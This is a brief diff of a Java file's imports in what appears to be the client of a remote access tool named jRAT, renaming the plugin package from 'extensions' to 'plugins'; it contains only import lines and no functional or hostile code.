@@ -8,8 +8,8 @@ import javax.swing.JTable;
 import javax.swing.ScrollPaneConstants;
 import javax.swing.table.DefaultTableModel;
 
-import su.jrat.client.extensions.Plugin;
-import su.jrat.client.extensions.PluginLoader;
+import su.jrat.client.plugins.Plugin;
+import su.jrat.client.plugins.PluginLoader;
 import su.jrat.client.ui.renderers.table.PluginsTableRenderer;
 
 
